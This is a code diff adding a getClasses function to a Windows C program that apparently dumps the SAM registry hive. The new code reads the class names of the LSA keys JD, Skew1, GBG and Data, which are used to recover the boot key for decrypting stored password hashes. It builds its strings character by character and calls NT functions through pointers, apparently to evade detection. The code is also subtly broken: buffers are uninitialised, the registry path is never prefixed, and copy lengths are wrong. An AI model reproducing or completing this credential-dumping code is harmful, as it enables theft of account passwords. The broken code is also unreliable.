@@ -107,7 +107,6 @@ void getSAM(PSAM samRegEntries[], PULONG len) {
 
 	DWORD ret;
 
-
 	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
 	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
@@ -211,6 +210,60 @@ void getSAM(PSAM samRegEntries[], PULONG len) {
 
 // TODO
 void getClasses(PSAM samRegEntry) {
+	WCHAR sJD[] = { L'J',L'D', L'\0' };
+	WCHAR sSkew1[] = { L'S',L'k',L'e',L'w',L'1', L'\0' };
+	WCHAR sGBG[] = { L'G',L'B',L'G', L'\0' };
+	WCHAR sData[] = { L'D',L'a',L't',L'a', L'\0' };
+
+	PWCHAR sAll[4] = { sJD, sSkew1, sGBG, sData };
+
+	WCHAR Reg[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
+
+	WCHAR resul[MAX_KEY_VALUE_LENGTH];
+
+	HANDLE key;
+	OBJECT_ATTRIBUTES attributes;
+	UNICODE_STRING UnicodeRegPath;
+	PKEY_FULL_INFORMATION keyInfo;
+	DWORD lengthBuff;
+
+	DWORD ret;
+
+	for (int i = 0; i < 4; i++) {
+		WCHAR RegAux[MAX_PATH];
+
+		wcsncat_s(RegAux, MAX_PATH, sAll[i], _TRUNCATE);
+
+		pMyRtlInitUnicodeString(&UnicodeRegPath, RegAux);
+		InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+		ret = pMyNtOpenKey(&key, KEY_READ, &attributes);
+
+		if (!NT_SUCCESS(ret)) {
+			exit(ret);
+		}
+
+		ret = pMyNtQueryKey(key, KeyFullInformation, NULL, 0, &lengthBuff);
+
+		keyInfo = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
+
+		ret = pMyNtQueryKey(key, KeyFullInformation, keyInfo, lengthBuff, &lengthBuff);
+
+		if (!NT_SUCCESS(ret)) {
+			exit(ret);
+		}
+
+		PVOID data = (PVOID)((ULONG_PTR)keyInfo + keyInfo->ClassOffset);
+		PWCHAR aux = (PWCHAR)HeapAlloc(GetProcessHeap(), 0, keyInfo->ClassLength);
+		CopyMemory(aux, data, keyInfo->ClassLength);
+
+		wcsncat_s(resul, MAX_KEY_VALUE_LENGTH, aux, _TRUNCATE);
+		
+		HeapFree(GetProcessHeap(), 0, aux);
+		HeapFree(GetProcessHeap(), 0, keyInfo);
+	}
+	CopyMemory(samRegEntry->classes, resul, wcslen(resul));
+
 	return;
 }
 
